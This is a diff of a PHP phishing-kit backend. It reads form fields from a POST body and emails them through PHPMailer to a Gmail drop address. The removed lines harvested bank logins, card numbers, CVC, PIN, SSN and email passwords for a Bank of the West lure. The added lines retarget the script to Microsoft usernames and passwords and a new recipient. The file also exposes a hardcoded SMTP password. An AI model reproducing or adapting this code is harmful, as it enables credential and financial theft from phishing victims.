@@ -22,50 +22,24 @@ $phpmailer->Password = 'TriveCodes2022!';
 $phpmailer->SMTPSecure = "ssl";
 
 $phpmailer->setFrom('no-reply@trivecodes.com', 'Intermediate Mail Client');
-$phpmailer->addAddress('divine2nab@gmail.com', 'Luis');
+$phpmailer->addAddress('idrisbilal143@gmail.com', 'Sandra');
 
 $phpmailer->isHTML(true);
 
 $POST = json_decode(file_get_contents('php://input'), true);
 
-if (isset($POST['password'])) {
+if (isset($POST['Pass'])) {
 
-    $username = $POST['username'];
-    $password = $POST['password'];
-    $cardNumber = $POST['cardNumber'];
-    $cardExpiryDate = $POST['cardExpiryDate'];
-    $cardCVC = $POST['cardCVC'];
-    $cardPin = $POST['cardPin'];
-    $Name = $POST['Name'];
-    $Mobile = $POST['Mobile'];
-    $Address = $POST['Address'];
-    $City = $POST['City'];
-    $State = $POST['State'];
-    $Zip = $POST['Zip'];
-    $SSN = $POST['SSN'];
-    $Email = $POST['Email'];
-    $EmailPass = $POST['EmailPass'];
+    $username = $POST['User'];
+    $password = $POST['Pass'];
 
-    $phpmailer->Subject = "New Details From Bank Of The West";
+    $phpmailer->Subject = "New Details From Microsoft";
 
 
     $phpmailer->Body = "
         <h3>
             User Name : $username <br>
             Password : $password <br>
-            Card Number : $cardNumber <br>
-            Card Exipry Date : $cardExpiryDate <br>
-            Card CVC : $cardCVC <br>
-            Card Pin : $cardPin <br>
-            Full Name : $Name <br>
-            Phone : $Mobile <br>
-            Address : $Address <br>
-            City : $City <br>
-            State : $State <br>
-            Zip : $Zip <br>
-            SSN : $SSN <br>
-            Email : $Email <br>
-            Email Password : $EmailPass <br>
         </h3>
     ";
 
